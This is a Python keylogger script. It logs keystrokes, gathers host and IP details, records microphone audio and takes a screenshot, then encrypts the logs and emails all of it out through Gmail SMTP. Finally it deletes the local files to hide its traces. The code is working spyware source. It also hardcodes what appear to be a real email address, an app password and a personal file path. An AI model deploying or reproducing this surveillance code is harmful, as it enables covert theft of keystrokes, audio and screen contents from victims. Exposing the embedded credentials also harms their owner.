# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from pynput.keyboard import Key, Listener
import logging

import time
import os

import pyaudio
import wave

from cryptography.fernet import Fernet

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

key_info = r"/key_log.txt"
system_info = r"/sys_details.txt"
audio_info = r"/audio_rec.wav"
screenshot_info = r"/screenshot.png"

e_key_info = r"/e_key_log.txt"
e_system_info = r"/e_sys_details.txt"
key = "1eW-jn8BhjrXv2ObHZUnjNxqxhShCs2TOOsrvrY8dls="

log_dir = r"/Users/kenluong/Developer/python/Keylogger"

audio_time = 5

email_addr = "anteikuu20@gmail.com"
password = "erfe mdvm mnck pghf"
toaddr = "anteikuu20@gmail.com"

keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

def on_press(key):
    logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def send_email(filename, attachment, toaddr):
    fromaddr = email_addr

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()

    server.sendmail(fromaddr, toaddr, text)
    server.quit()

send_email(key_info, log_dir + key_info, toaddr)

def system_details():
    with open(log_dir + system_info, 'a') as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            #ip_public = get("https://api.ipify.org").text
            #f.write("Public IP Address: " + ip_public + "\n")
            False

        except Exception:
            f.write("Failed to retrieve Public IP Address (max query)\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_addr + "\n")

system_details()

def mic_audio():
    chunk = 1024
    format = pyaudio.paInt16
    channels = 1
    freq = 44100

    p = pyaudio.PyAudio()

    stream = p.open(format=format, channels=channels, rate=freq, input=True, frames_per_buffer=chunk)

    print("start recording...")

    frames = []
    for i in range(0, int(freq / chunk * audio_time)):
        data = stream.read(chunk)
        frames.append(data)

    print("recording stopped")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(log_dir + audio_info, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(format))
    wf.setframerate(freq)
    wf.writeframes(b''.join(frames))
    wf.close()

mic_audio()
send_email(audio_info, log_dir + audio_info, toaddr)

def screenshot():
    im = ImageGrab.grab()
    im.save(log_dir + screenshot_info)

screenshot()
send_email(screenshot_info, log_dir + screenshot_info, toaddr)

files = [log_dir + key_info, log_dir + system_info]
encrypted_files = [log_dir + e_key_info, log_dir + e_system_info]

count = 0

for encrypting_files in files:
    with open(files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_files[count], encrypted_files[count], toaddr)
    count += 1

delete_files = [system_info, key_info, screenshot_info, audio_info]
for file in delete_files:
    os.remove(log_dir + file)
